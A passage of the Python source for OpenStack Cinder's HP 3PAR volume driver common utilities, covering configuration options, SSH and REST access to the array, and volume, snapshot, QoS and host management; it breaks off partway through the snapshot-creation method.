tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver common utilities for HP 3PAR Storage array\n\nThe 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nThe drivers uses both the REST service and the SSH\ncommand line to correctly operate.  Since the\nssh credentials and the REST credentials can be different\nwe need to have settings for both.\n\nThe drivers requires the use of the san_ip, san_login,\nsan_password settings for ssh connections into the 3PAR\narray.   It also requires the setting of\nhp3par_api_url, hp3par_username, hp3par_password\nfor credentials to talk to the REST service on the 3PAR\narray.\n\"\"\"\n\nimport ast\nimport base64\nimport json\nimport paramiko\nimport pprint\nfrom random import randint\nimport re\nimport time\nimport uuid\n\nfrom eventlet import greenthread\nfrom hp3parclient import client\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import context\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nfrom cinder.volume import volume_types\n\n\nLOG = logging.getLogger(__name__)\n\nhp3par_opts = [\n    cfg.StrOpt('hp3par_api_url',\n               default='',\n               help=\"3PAR WSAPI Server Url like \"\n                    \"https://<3par ip>:8080/api/v1\"),\n    cfg.StrOpt('hp3par_username',\n               default='',\n               help=\"3PAR Super user username\"),\n    cfg.StrOpt('hp3par_password',\n               default='',\n               help=\"3PAR Super user password\",\n               secret=True),\n    #TODO(kmartin): Remove hp3par_domain during I release.\n    cfg.StrOpt('hp3par_domain',\n               default=None,\n               help=\"This option is DEPRECATED and no longer used. \"\n                    \"The 3par domain name to use.\"),\n    cfg.StrOpt('hp3par_cpg',\n               default=\"OpenStack\",\n               help=\"The CPG to use for volume creation\"),\n    cfg.StrOpt('hp3par_cpg_snap',\n               default=\"\",\n               help=\"The CPG to use for Snapshots for volumes. \"\n                    \"If empty hp3par_cpg will be used\"),\n    cfg.StrOpt('hp3par_snapshot_retention',\n               default=\"\",\n               help=\"The time in hours to retain a snapshot.  \"\n                    \"You can't delete it before this expires.\"),\n    cfg.StrOpt('hp3par_snapshot_expiration',\n               default=\"\",\n               help=\"The time in hours when a snapshot expires \"\n                    \" and is deleted.  This must be larger than expiration\"),\n    cfg.BoolOpt('hp3par_debug',\n                default=False,\n                help=\"Enable HTTP debugging to 3PAR\"),\n    cfg.ListOpt('hp3par_iscsi_ips',\n                default=[],\n                help=\"List of target iSCSI addresses to use.\")\n]\n\n\nCONF = cfg.CONF\nCONF.register_opts(hp3par_opts)\n\n\nclass HP3PARCommon(object):\n\n    stats = {}\n\n    # Valid values for volume type extra specs\n    # The first value in the list is the default value\n    valid_prov_values = ['thin', 'full']\n    valid_persona_values = ['1 - Generic',\n                            '2 - Generic-ALUA',\n                            '6 - Generic-legacy',\n                            '7 - HPUX-legacy',\n                            '8 - AIX-legacy',\n                            '9 - EGENERA',\n                            '10 - ONTAP-legacy',\n                            '11 - VMware',\n                            '12 - OpenVMS']\n    hp_qos_keys = ['maxIOPS', 'maxBWS']\n    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']\n\n    def __init__(self, config):\n        self.sshpool = None\n        self.config = config\n        self.hosts_naming_dict = dict()\n        self.client = None\n        if CONF.hp3par_domain is not None:\n            LOG.deprecated(_(\"hp3par_domain has been deprecated and \"\n                             \"is no longer used. The domain is automatically \"\n                             \"looked up based on the CPG.\"))\n\n    def check_flags(self, options, required_flags):\n        for flag in required_flags:\n            if not getattr(options, flag, None):\n                raise exception.InvalidInput(reason=_('%s is not set') % flag)\n\n    def _create_client(self):\n        return client.HP3ParClient(self.config.hp3par_api_url)\n\n    def client_login(self):\n        try:\n            LOG.debug(\"Connecting to 3PAR\")\n            self.client.login(self.config.hp3par_username,\n                              self.config.hp3par_password)\n        except hpexceptions.HTTPUnauthorized as ex:\n            LOG.warning(\"Failed to connect to 3PAR (%s) because %s\" %\n                       (self.config.hp3par_api_url, str(ex)))\n            msg = _(\"Login to 3PAR array invalid\")\n            raise exception.InvalidInput(reason=msg)\n\n    def client_logout(self):\n        self.client.logout()\n        LOG.debug(\"Disconnect from 3PAR\")\n\n    def do_setup(self, context):\n        self.client = self._create_client()\n        if self.config.hp3par_debug:\n            self.client.debug_rest(True)\n\n        self.client_login()\n\n        try:\n            # make sure the default CPG exists\n            self.validate_cpg(self.config.hp3par_cpg)\n            self._set_connections()\n        finally:\n            self.client_logout()\n\n    def validate_cpg(self, cpg_name):\n        try:\n            cpg = self.client.getCPG(cpg_name)\n        except hpexceptions.HTTPNotFound as ex:\n            err = (_(\"CPG (%s) doesn't exist on array\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n    def _set_connections(self):\n        \"\"\"Set the number of concurrent connections.\n\n        The 3PAR WS API server has a limit of concurrent connections.\n        This is setting the number to the highest allowed, 15 connections.\n        \"\"\"\n        self._cli_run(['setwsapi', '-sru', 'high'])\n\n    def get_domain(self, cpg_name):\n        try:\n            cpg = self.client.getCPG(cpg_name)\n        except hpexceptions.HTTPNotFound:\n            err = (_(\"Failed to get domain because CPG (%s) doesn't \"\n                     \"exist on array.\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        domain = cpg['domain']\n        if not domain:\n            err = (_(\"CPG (%s) must be in a domain\") % cpg_name)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n        return domain\n\n    def extend_volume(self, volume, new_size):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        old_size = volume.size\n        growth_size = int(new_size) - old_size\n        LOG.debug(\"Extending Volume %s from %s to %s, by %s GB.\" %\n                  (volume_name, old_size, new_size, growth_size))\n        try:\n            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error extending volume %s\") % volume)\n\n    def _get_3par_vol_name(self, volume_id):\n        \"\"\"Get converted 3PAR volume name.\n\n        Converts the openstack volume id from\n        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2\n        to\n        osv-7P.DD5jLTPWF7tcwnMF80g\n\n        We convert the 128 bits of the uuid into a 24character long\n        base64 encoded string to ensure we don't exceed the maximum\n        allowed 31 character name limit on 3Par\n\n        We strip the padding '=' and replace + with .\n        and / with -\n        \"\"\"\n        volume_name = self._encode_name(volume_id)\n        return \"osv-%s\" % volume_name\n\n    def _get_3par_snap_name(self, snapshot_id):\n        snapshot_name = self._encode_name(snapshot_id)\n        return \"oss-%s\" % snapshot_name\n\n    def _get_3par_vvs_name(self, volume_id):\n        vvs_name = self._encode_name(volume_id)\n        return \"vvs-%s\" % vvs_name\n\n    def _encode_name(self, name):\n        uuid_str = name.replace(\"-\", \"\")\n        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)\n        vol_encoded = base64.b64encode(vol_uuid.bytes)\n\n        # 3par doesn't allow +, nor /\n        vol_encoded = vol_encoded.replace('+', '.')\n        vol_encoded = vol_encoded.replace('/', '-')\n        # strip off the == as 3par doesn't like those.\n        vol_encoded = vol_encoded.replace('=', '')\n        return vol_encoded\n\n    def _capacity_from_size(self, vol_size):\n\n        # because 3PAR volume sizes are in\n        # Mebibytes, Gigibytes, not Megabytes.\n        MB = 1000L\n        MiB = 1.048576\n\n        if int(vol_size) == 0:\n            capacity = MB  # default: 1GB\n        else:\n            capacity = vol_size * MB\n\n        capacity = int(round(capacity / MiB))\n        return capacity\n\n    def _cli_run(self, cmd):\n        \"\"\"Runs a CLI command over SSH, without doing any result parsing.\"\"\"\n        LOG.debug(\"SSH CMD = %s \" % cmd)\n\n        (stdout, stderr) = self._run_ssh(cmd, False)\n\n        # we have to strip out the input and exit lines\n        tmp = stdout.split(\"\\r\\n\")\n        out = tmp[5:len(tmp) - 2]\n        return out\n\n    def _ssh_execute(self, ssh, cmd, check_exit_code=True):\n        \"\"\"We have to do this in order to get CSV output from the CLI command.\n\n        We first have to issue a command to tell the CLI that we want the\n        output to be formatted in CSV, then we issue the real command.\n        \"\"\"\n        LOG.debug(_('Running cmd (SSH): %s'), cmd)\n\n        channel = ssh.invoke_shell()\n        stdin_stream = channel.makefile('wb')\n        stdout_stream = channel.makefile('rb')\n        stderr_stream = channel.makefile('rb')\n\n        stdin_stream.write('''setclienv csvtable 1\n%s\nexit\n''' % cmd)\n\n        # stdin.write('process_input would go here')\n        # stdin.flush()\n\n        # NOTE(justinsb): This seems suspicious...\n        # ...other SSH clients have buffering issues with this approach\n        stdout = stdout_stream.read()\n        stderr = stderr_stream.read()\n        stdin_stream.close()\n        stdout_stream.close()\n        stderr_stream.close()\n\n        exit_status = channel.recv_exit_status()\n\n        # exit_status == -1 if no exit code was returned\n        if exit_status != -1:\n            LOG.debug(_('Result was %s') % exit_status)\n            if check_exit_code and exit_status != 0:\n                raise exception.ProcessExecutionError(exit_code=exit_status,\n                                                      stdout=stdout,\n                                                      stderr=stderr,\n                                                      cmd=cmd)\n        channel.close()\n        return (stdout, stderr)\n\n    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):\n        utils.check_ssh_injection(cmd_list)\n        command = ' '. join(cmd_list)\n\n        if not self.sshpool:\n            self.sshpool = utils.SSHPool(self.config.san_ip,\n                                         self.config.san_ssh_port,\n                                         self.config.ssh_conn_timeout,\n                                         self.config.san_login,\n                                         password=self.config.san_password,\n                                         privatekey=\n                                         self.config.san_private_key,\n                                         min_size=\n                                         self.config.ssh_min_pool_conn,\n                                         max_size=\n                                         self.config.ssh_max_pool_conn)\n        try:\n            total_attempts = attempts\n            with self.sshpool.item() as ssh:\n                while attempts > 0:\n                    attempts -= 1\n                    try:\n                        return self._ssh_execute(ssh, command,\n                                                 check_exit_code=check_exit)\n                    except Exception as e:\n                        LOG.error(e)\n                        greenthread.sleep(randint(20, 500) / 100.0)\n                msg = (_(\"SSH Command failed after '%(total_attempts)r' \"\n                         \"attempts : '%(command)s'\") %\n                       {'total_attempts': total_attempts, 'command': command})\n                raise paramiko.SSHException(msg)\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error running ssh command: %s\") % command)\n\n    def _delete_3par_host(self, hostname):\n        self._cli_run(['removehost', hostname])\n\n    def _create_3par_vlun(self, volume, hostname):\n        out = self._cli_run(['createvlun', volume, 'auto', hostname])\n        if out and len(out) > 1:\n            if \"must be in the same domain\" in out[0]:\n                err = out[0].strip()\n                err = err + \" \" + out[1].strip()\n                raise exception.Invalid3PARDomain(err=err)\n\n    def _safe_hostname(self, hostname):\n        \"\"\"We have to use a safe hostname length for 3PAR host names.\"\"\"\n        try:\n            index = hostname.index('.')\n        except ValueError:\n            # couldn't find it\n            index = len(hostname)\n\n        # we'll just chop this off for now.\n        if index > 23:\n            index = 23\n\n        return hostname[:index]\n\n    def _get_3par_host(self, hostname):\n        out = self._cli_run(['showhost', '-verbose', hostname])\n        LOG.debug(\"OUTPUT = \\n%s\" % (pprint.pformat(out)))\n        host = {'id': None, 'name': None,\n                'domain': None,\n                'descriptors': {},\n                'iSCSIPaths': [],\n                'FCPaths': []}\n\n        if out:\n            err = out[0]\n            if err == 'no hosts listed':\n                msg = {'code': 'NON_EXISTENT_HOST',\n                       'desc': \"HOST '%s' was not found\" % hostname}\n                raise hpexceptions.HTTPNotFound(msg)\n\n            # start parsing the lines after the header line\n            for line in out[1:]:\n                if line == '':\n                    break\n                tmp = line.split(',')\n                paths = {}\n\n                LOG.debug(\"line = %s\" % (pprint.pformat(tmp)))\n                host['id'] = tmp[0]\n                host['name'] = tmp[1]\n\n                portPos = tmp[4]\n                LOG.debug(\"portPos = %s\" % (pprint.pformat(portPos)))\n                if portPos == '---':\n                    portPos = None\n                else:\n                    port = portPos.split(':')\n                    portPos = {'node': int(port[0]), 'slot': int(port[1]),\n                               'cardPort': int(port[2])}\n\n                paths['portPos'] = portPos\n\n                # If FC entry\n                if tmp[5] == 'n/a':\n                    paths['wwn'] = tmp[3]\n                    host['FCPaths'].append(paths)\n                # else iSCSI entry\n                else:\n                    paths['name'] = tmp[3]\n                    paths['ipAddr'] = tmp[5]\n                    host['iSCSIPaths'].append(paths)\n\n            # find the offset to the description stuff\n            offset = 0\n            for line in out:\n                if line[:15] == '---------- Host':\n                    break\n                else:\n                    offset += 1\n\n            info = out[offset + 2]\n            tmp = info.split(':')\n            host['domain'] = tmp[1]\n\n            info = out[offset + 4]\n            tmp = info.split(':')\n            host['descriptors']['location'] = tmp[1]\n\n            info = out[offset + 5]\n            tmp = info.split(':')\n            host['descriptors']['ipAddr'] = tmp[1]\n\n            info = out[offset + 6]\n            tmp = info.split(':')\n            host['descriptors']['os'] = tmp[1]\n\n            info = out[offset + 7]\n            tmp = info.split(':')\n            host['descriptors']['model'] = tmp[1]\n\n            info = out[offset + 8]\n            tmp = info.split(':')\n            host['descriptors']['contact'] = tmp[1]\n\n            info = out[offset + 9]\n            tmp = info.split(':')\n            host['descriptors']['comment'] = tmp[1]\n\n        return host\n\n    def get_ports(self):\n        # First get the active FC ports\n        out = self._cli_run(['showport'])\n\n        # strip out header\n        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,\n        # Protocol,Label,Partner,FailoverState\n        out = out[1:len(out) - 2]\n\n        ports = {'FC': [], 'iSCSI': {}}\n        for line in out:\n            tmp = line.split(',')\n\n            if tmp:\n                if tmp[1] == 'target' and tmp[2] == 'ready':\n                    if tmp[6] == 'FC':\n                        ports['FC'].append(tmp[4])\n\n        # now get the active iSCSI ports\n        out = self._cli_run(['showport', '-iscsi'])\n\n        # strip out header\n        # N:S:P,State,IPAddr,Netmask,Gateway,\n        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port\n        out = out[1:len(out) - 2]\n        for line in out:\n            tmp = line.split(',')\n\n            if tmp and len(tmp) > 2:\n                if tmp[1] == 'ready':\n                    ports['iSCSI'][tmp[2]] = {}\n\n        # now get the nsp and iqn\n        result = self._cli_run(['showport', '-iscsiname'])\n        if result:\n            # first line is header\n            # nsp, ip,iqn\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 2:\n                    if info[1] in ports['iSCSI']:\n                        nsp = info[0]\n                        ip_addr = info[1]\n                        iqn = info[2]\n                        ports['iSCSI'][ip_addr] = {'nsp': nsp,\n                                                   'iqn': iqn\n                                                   }\n\n        LOG.debug(\"PORTS = %s\" % pprint.pformat(ports))\n        return ports\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_volume_stats()\n\n        return self.stats\n\n    def _update_volume_stats(self):\n        # const to convert MiB to GB\n        const = 0.0009765625\n\n        # storage_protocol and volume_backend_name are\n        # set in the child classes\n        stats = {'driver_version': '1.0',\n                 'free_capacity_gb': 'unknown',\n                 'reserved_percentage': 0,\n                 'storage_protocol': None,\n                 'total_capacity_gb': 'unknown',\n                 'QoS_support': True,\n                 'vendor_name': 'Hewlett-Packard',\n                 'volume_backend_name': None}\n\n        try:\n            cpg = self.client.getCPG(self.config.hp3par_cpg)\n            if 'limitMiB' not in cpg['SDGrowth']:\n                total_capacity = 'infinite'\n                free_capacity = 'infinite'\n            else:\n                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)\n                free_capacity = int((cpg['SDGrowth']['limitMiB'] -\n                                    cpg['UsrUsage']['usedMiB']) * const)\n\n            stats['total_capacity_gb'] = total_capacity\n            stats['free_capacity_gb'] = free_capacity\n        except hpexceptions.HTTPNotFound:\n            err = (_(\"CPG (%s) doesn't exist on array\")\n                   % self.config.hp3par_cpg)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        self.stats = stats\n\n    def create_vlun(self, volume, host):\n        \"\"\"Create a VLUN.\n\n        In order to export a volume on a 3PAR box, we have to create a VLUN.\n        \"\"\"\n        volume_name = self._get_3par_vol_name(volume['id'])\n        self._create_3par_vlun(volume_name, host['name'])\n        return self.client.getVLUN(volume_name)\n\n    def delete_vlun(self, volume, hostname):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        vlun = self.client.getVLUN(volume_name)\n        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)\n        self._delete_3par_host(hostname)\n\n    def _get_volume_type(self, type_id):\n        ctxt = context.get_admin_context()\n        return volume_types.get_volume_type(ctxt, type_id)\n\n    def _get_key_value(self, hp3par_keys, key, default=None):\n        if hp3par_keys is not None and key in hp3par_keys:\n            return hp3par_keys[key]\n        else:\n            return default\n\n    def _get_qos_value(self, qos, key, default=None):\n        if key in qos:\n            return qos[key]\n        else:\n            return default\n\n    def _get_qos_by_volume_type(self, volume_type):\n        qos = {}\n        specs = volume_type.get('extra_specs')\n        for key, value in specs.iteritems():\n            if 'qos:' in key:\n                fields = key.split(':')\n                key = fields[1]\n            if key in self.hp_qos_keys:\n                qos[key] = int(value)\n        return qos\n\n    def _get_keys_by_volume_type(self, volume_type):\n        hp3par_keys = {}\n        specs = volume_type.get('extra_specs')\n        for key, value in specs.iteritems():\n            if ':' in key:\n                fields = key.split(':')\n                key = fields[1]\n            if key in self.hp3par_valid_keys:\n                hp3par_keys[key] = value\n        return hp3par_keys\n\n    def _set_qos_rule(self, qos, vvs_name):\n        max_io = self._get_qos_value(qos, 'maxIOPS')\n        max_bw = self._get_qos_value(qos, 'maxBWS')\n        cli_qos_string = \"\"\n        if max_io is not None:\n            cli_qos_string += ('-io %s ' % max_io)\n        if max_bw is not None:\n            cli_qos_string += ('-bw %sM ' % max_bw)\n        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])\n\n    def _add_volume_to_volume_set(self, volume, volume_name,\n                                  cpg, vvs_name, qos):\n        if vvs_name is not None:\n            # Admin has set a volume set name to add the volume to\n            self._cli_run(['createvvset', '-add', vvs_name, volume_name])\n        else:\n            vvs_name = self._get_3par_vvs_name(volume['id'])\n            domain = self.get_domain(cpg)\n            self._cli_run(['createvvset', '-domain', domain, vvs_name])\n            self._set_qos_rule(qos, vvs_name)\n            self._cli_run(['createvvset', '-add', vvs_name, volume_name])\n\n    def _remove_volume_set(self, vvs_name):\n        # Must first clear the QoS rules before removing the volume set\n        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])\n        self._cli_run(['removevvset', '-f', vvs_name])\n\n    def _remove_volume_from_volume_set(self, volume_name, vvs_name):\n        self._cli_run(['removevvset', '-f', vvs_name, volume_name])\n\n    def get_cpg(self, volume, allowSnap=False):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        vol = self.client.getVolume(volume_name)\n        if 'userCPG' in vol:\n            return vol['userCPG']\n        elif allowSnap:\n            return vol['snapCPG']\n        return None\n\n    def _get_3par_vol_comment(self, volume_name):\n        vol = self.client.getVolume(volume_name)\n        if 'comment' in vol:\n            return vol['comment']\n        return None\n\n    def get_persona_type(self, volume, hp3par_keys=None):\n        default_persona = self.valid_persona_values[0]\n        type_id = volume.get('volume_type_id', None)\n        volume_type = None\n        if type_id is not None:\n            volume_type = self._get_volume_type(type_id)\n            if hp3par_keys is None:\n                hp3par_keys = self._get_keys_by_volume_type(volume_type)\n        persona_value = self._get_key_value(hp3par_keys, 'persona',\n                                            default_persona)\n        if persona_value not in self.valid_persona_values:\n            err = _(\"Must specify a valid persona %(valid)s, \"\n                    \"value '%(persona)s' is invalid.\") % \\\n                   ({'valid': self.valid_persona_values,\n                     'persona': persona_value})\n            raise exception.InvalidInput(reason=err)\n        # persona is set by the id so remove the text and return the id\n        # i.e for persona '1 - Generic' returns 1\n        persona_id = persona_value.split(' ')\n        return persona_id[0]\n\n    def get_volume_settings_from_type(self, volume):\n        cpg = None\n        snap_cpg = None\n        volume_type = None\n        vvs_name = None\n        hp3par_keys = {}\n        qos = {}\n        type_id = volume.get('volume_type_id', None)\n        if type_id is not None:\n            volume_type = self._get_volume_type(type_id)\n            hp3par_keys = self._get_keys_by_volume_type(volume_type)\n            vvs_name = self._get_key_value(hp3par_keys, 'vvs')\n            if vvs_name is None:\n                qos = self._get_qos_by_volume_type(volume_type)\n\n        cpg = self._get_key_value(hp3par_keys, 'cpg',\n                                  self.config.hp3par_cpg)\n        if cpg is not self.config.hp3par_cpg:\n            # The cpg was specified in a volume type extra spec so it\n            # needs to be validiated that it's in the correct domain.\n            self.validate_cpg(cpg)\n            # Also, look to see if the snap_cpg was specified in volume\n            # type extra spec, if not use the extra spec cpg as the\n            # default.\n            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)\n        else:\n            # default snap_cpg to hp3par_cpg_snap if it's not specified\n            # in the volume type extra specs.\n            snap_cpg = self.config.hp3par_cpg_snap\n            # if it's still not set or empty then set it to the cpg\n            # specified in the cinder.conf file.\n            if not self.config.hp3par_cpg_snap:\n                snap_cpg = cpg\n\n        # if provisioning is not set use thin\n        default_prov = self.valid_prov_values[0]\n        prov_value = self._get_key_value(hp3par_keys, 'provisioning',\n                                         default_prov)\n        # check for valid provisioning type\n        if prov_value not in self.valid_prov_values:\n            err = _(\"Must specify a valid provisioning type %(valid)s, \"\n                    \"value '%(prov)s' is invalid.\") % \\\n                   ({'valid': self.valid_prov_values,\n                     'prov': prov_value})\n            raise exception.InvalidInput(reason=err)\n\n        tpvv = True\n        if prov_value == \"full\":\n            tpvv = False\n\n        # check for valid persona even if we don't use it until\n        # attach time, this will give the end user notice that the\n        # persona type is invalid at volume creation time\n        self.get_persona_type(volume, hp3par_keys)\n\n        return {'cpg': cpg, 'snap_cpg': snap_cpg,\n                'vvs_name': vvs_name, 'qos': qos,\n                'tpvv': tpvv, 'volume_type': volume_type}\n\n    def create_volume(self, volume):\n        LOG.debug(\"CREATE VOLUME (%s : %s %s)\" %\n                  (volume['display_name'], volume['name'],\n                   self._get_3par_vol_name(volume['id'])))\n        try:\n            comments = {'volume_id': volume['id'],\n                        'name': volume['name'],\n                        'type': 'OpenStack'}\n\n            name = volume.get('display_name', None)\n            if name:\n                comments['display_name'] = name\n\n            # get the options supported by volume types\n            type_info = self.get_volume_settings_from_type(volume)\n            volume_type = type_info['volume_type']\n            vvs_name = type_info['vvs_name']\n            qos = type_info['qos']\n            cpg = type_info['cpg']\n            snap_cpg = type_info['snap_cpg']\n            tpvv = type_info['tpvv']\n\n            type_id = volume.get('volume_type_id', None)\n            if type_id is not None:\n                comments['volume_type_name'] = volume_type.get('name')\n                comments['volume_type_id'] = type_id\n                if vvs_name is not None:\n                    comments['vvs'] = vvs_name\n                else:\n                    comments['qos'] = qos\n\n            extras = {'comment': json.dumps(comments),\n                      'snapCPG': snap_cpg,\n                      'tpvv': tpvv}\n\n            capacity = self._capacity_from_size(volume['size'])\n            volume_name = self._get_3par_vol_name(volume['id'])\n            self.client.createVolume(volume_name, cpg, capacity, extras)\n            if qos or vvs_name is not None:\n                try:\n                    self._add_volume_to_volume_set(volume, volume_name,\n                                                   cpg, vvs_name, qos)\n                except Exception as ex:\n                    # Delete the volume if unable to add it to the volume set\n                    self.client.deleteVolume(volume_name)\n                    LOG.error(str(ex))\n                    raise exception.CinderException(ex.get_description())\n        except hpexceptions.HTTPConflict:\n            raise exception.Duplicate(_(\"Volume (%s) already exists on array\")\n                                      % volume_name)\n        except hpexceptions.HTTPBadRequest as ex:\n            LOG.error(str(ex))\n            raise exception.Invalid(ex.get_description())\n        except exception.InvalidInput as ex:\n            LOG.error(str(ex))\n            raise ex\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex.get_description())\n\n    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,\n                     tpvv=True):\n        # Virtual volume sets are not supported with the -online option\n        cmd = ['createvvcopy', '-p', src_name, '-online']\n        if snap_cpg:\n            cmd.extend(['-snp_cpg', snap_cpg])\n        if tpvv:\n            cmd.append('-tpvv')\n        if cpg:\n            cmd.append(cpg)\n        cmd.append(dest_name)\n        LOG.debug('Creating clone of a volume with %s' % cmd)\n        self._cli_run(cmd)\n\n    def get_next_word(self, s, search_string):\n        \"\"\"Return the next word.\n\n        Search 's' for 'search_string', if found return the word preceding\n        'search_string' from 's'.\n        \"\"\"\n        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)\n        return word.groups()[0].strip(' ')\n\n    def _get_3par_vol_comment_value(self, vol_comment, key):\n        comment_dict = dict(ast.literal_eval(vol_comment))\n        if key in comment_dict:\n            return comment_dict[key]\n        return None\n\n    def create_cloned_volume(self, volume, src_vref):\n        try:\n            orig_name = self._get_3par_vol_name(volume['source_volid'])\n            vol_name = self._get_3par_vol_name(volume['id'])\n\n            type_info = self.get_volume_settings_from_type(volume)\n\n            # make the 3PAR copy the contents.\n            # can't delete the original until the copy is done.\n            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],\n                              snap_cpg=type_info['snap_cpg'],\n                              tpvv=type_info['tpvv'])\n            return None\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex)\n\n    def _get_vvset_from_3par(self, volume_name):\n        \"\"\"Get Virtual Volume Set from 3PAR.\n\n        The only way to do this currently is to try and delete the volume\n        to get the error message.\n\n        NOTE(walter-boring): don't call this unless you know the volume is\n        already in a vvset!\n        \"\"\"\n        cmd = ['removevv', '-f', volume_name]\n        LOG.debug(\"Issuing remove command to find vvset name %s\" % cmd)\n        out = self._cli_run(cmd)\n        vvset_name = None\n        if out and len(out) > 1:\n            if out[1].startswith(\"Attempt to delete \"):\n                words = out[1].split(\" \")\n                vvset_name = words[len(words) - 1]\n\n        return vvset_name\n\n    def delete_volume(self, volume):\n        try:\n            volume_name = self._get_3par_vol_name(volume['id'])\n            # Try and delete the volume, it might fail here because\n            # the volume is part of a volume set which will have the\n            # volume set name in the error.\n            try:\n                self.client.deleteVolume(volume_name)\n            except hpexceptions.HTTPConflict as ex:\n                if ex.get_code() == 34:\n                    # This is a special case which means the\n                    # volume is part of a volume set.\n                    vvset_name = self._get_vvset_from_3par(volume_name)\n                    LOG.debug(\"Returned vvset_name = %s\" % vvset_name)\n                    if vvset_name is not None and \\\n                       vvset_name.startswith('vvs-'):\n                        # We have a single volume per volume set, so\n                        # remove the volume set.\n                        self._remove_volume_set(\n                            self._get_3par_vvs_name(volume['id']))\n                    elif vvset_name is not None:\n                        # We have a pre-defined volume set just remove the\n                        # volume and leave the volume set.\n                        self._remove_volume_from_volume_set(volume_name,\n                                                            vvset_name)\n                    self.client.deleteVolume(volume_name)\n                else:\n                    raise ex\n\n        except hpexceptions.HTTPNotFound as ex:\n            # We'll let this act as if it worked\n            # it helps clean up the cinder entries.\n            LOG.error(str(ex))\n        except hpexceptions.HTTPForbidden as ex:\n            LOG.error(str(ex))\n            raise exception.NotAuthorized(ex.get_description())\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex)\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        LOG.debug(\"Create Volume from Snapshot\\n%s\\n%s\" %\n                  (pprint.pformat(volume['display_name']),\n                   pprint.pformat(snapshot['display_name'])))\n\n        if snapshot['volume_size'] != volume['size']:\n            err = \"You cannot change size of the volume.  It must \"\n            \"be the same as the snapshot.\"\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            volume_name = self._get_3par_vol_name(volume['id'])\n\n            extra = {'volume_id': volume['id'],\n                     'snapshot_id': snapshot['id']}\n\n            volume_type = None\n            type_id = volume.get('volume_type_id', None)\n            vvs_name = None\n            qos = {}\n            hp3par_keys = {}\n            if type_id is not None:\n                volume_type = self._get_volume_type(type_id)\n                hp3par_keys = self._get_keys_by_volume_type(volume_type)\n                vvs_name = self._get_key_value(hp3par_keys, 'vvs')\n                if vvs_name is None:\n                    qos = self._get_qos_by_volume_type(volume_type)\n\n            name = volume.get('display_name', None)\n            if name:\n                extra['display_name'] = name\n\n            description = volume.get('display_description', None)\n            if description:\n                extra['description'] = description\n\n            optional = {'comment': json.dumps(extra),\n                        'readOnly': False}\n\n            self.client.createSnapshot(volume_name, snap_name, optional)\n            if qos or vvs_name is not None:\n                cpg = self._get_key_value(hp3par_keys, 'cpg',\n                                          self.config.hp3par_cpg)\n                try:\n                    self._add_volume_to_volume_set(volume, volume_name,\n                                                   cpg, vvs_name, qos)\n                except Exception as ex:\n                    # Delete the volume if unable to add it to the volume set\n                    self.client.deleteVolume(volume_name)\n                    LOG.error(str(ex))\n                    raise exception.CinderException(ex.get_description())\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex.get_description())\n\n    def create_snapshot(self, snapshot):\n        LOG.debug(\"Create Snapshot\\n%s\" % pprint.pformat(snapshot))\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            vol_name = self._get_3par_vol_name(snapshot['volume_id'])\n\n            extra = {'volume_name': snapshot['volume_name']}\n            vol_id = 